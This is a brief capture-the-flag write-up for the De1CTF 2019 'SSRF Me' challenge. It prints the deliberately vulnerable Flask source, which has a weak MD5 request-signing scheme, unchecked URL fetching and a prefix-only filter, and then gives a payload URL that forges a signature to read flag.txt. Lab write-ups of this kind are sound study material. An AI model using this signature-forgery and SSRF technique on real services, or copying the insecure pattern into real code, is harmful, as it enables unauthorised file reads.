### [De1CTF 2019]SSRF Me

----

https://guokeya.github.io/post/3aEFZGLd6/

Python的代码审计

```python
#!/usr/bin/env python
# encoding=utf-8

from flask import Flask, request, redirect
import socket
import hashlib
import urllib
import sys
import os
import json

# 重新设置默认编码
reload(sys)
sys.setdefaultencoding('latin1')

app = Flask(__name__)
secert_key = os.urandom(16)

class Task:
    def __init__(self, action, param, sign, ip):
        self.action = action
        self.param = param
        self.sign = sign
        self.sandbox = md5(ip)
        if not os.path.exists(self.sandbox):
            # 创建沙盒目录
            os.mkdir(self.sandbox)

    def Exec(self):
        result = {
            'code': 500,
            'msg': 'Sign Error',
            'data': ''
        }
        if self.checkSign():
            if "scan" in self.action:
                tmpfile = open("./{}/result.txt".format(self.sandbox), 'w')
                resp = scan(self.param)
                if resp == "Connection Timeout":
                    result['data'] = resp
                else:
                    tmpfile.write(resp)
                    tmpfile.close()
                    result['code'] = 200
            elif "read" in self.action:
                try:
                    with open("./{}/result.txt".format(self.sandbox), 'r') as f:
                        result['code'] = 200
                        result['data'] = f.read()
                except FileNotFoundError:
                    result['code'] = 500
                    result['data'] = "File Not Found"
            else:
                result['code'] = 500
                result['data'] = "Action Error"
        else:
            result['code'] = 500
            result['msg'] = "Sign Error"
        return result

    def checkSign(self):
        return getSign(self.action, self.param) == self.sign

@app.route("/geneSign", methods=['GET', 'POST'])
def geneSign():
    param = urllib.unquote(request.args.get("param", ""))
    action = "scan"
    return getSign(action, param)

@app.route('/De1ta', methods=['GET', 'POST'])
def challenge():
    action = urllib.unquote(request.cookies.get("action"))
    param = urllib.unquote(request.args.get("param", ""))
    sign = urllib.unquote(request.cookies.get("sign"))
    ip = request.remote_addr
    if waf(param):
        return "No Hacker!!!!"
    task = Task(action, param, sign, ip)
    return json.dumps(task.Exec())

@app.route('/')
def index():
    return open("code.txt", "r").read()

def scan(param):
    socket.setdefaulttimeout(1)
    try:
        return urllib.urlopen(param).read()[:50]
    except:
        return "Connection Timeout"

def getSign(action, param):
    return hashlib.md5(secert_key + param.encode('utf-8') + action.encode('utf-8')).hexdigest()

def md5(content):
    return hashlib.md5(content.encode('utf-8')).hexdigest()

def waf(param):
    check = param.strip().lower()
    if check.startswith("gopher") or check.startswith("file"):
        return True
    return False

if __name__ == '__main__':
    app.debug = False
    app.run(host='0.0.0.0', port=80)

```









Payload:

```
http://839eac52-6545-435a-a10a-32651c906b30.node5.buuoj.cn:81/geneSign?param=flag.txtread
```

---->>>>

```
dcb5f375e749f26434300f9bec55dfcd
```

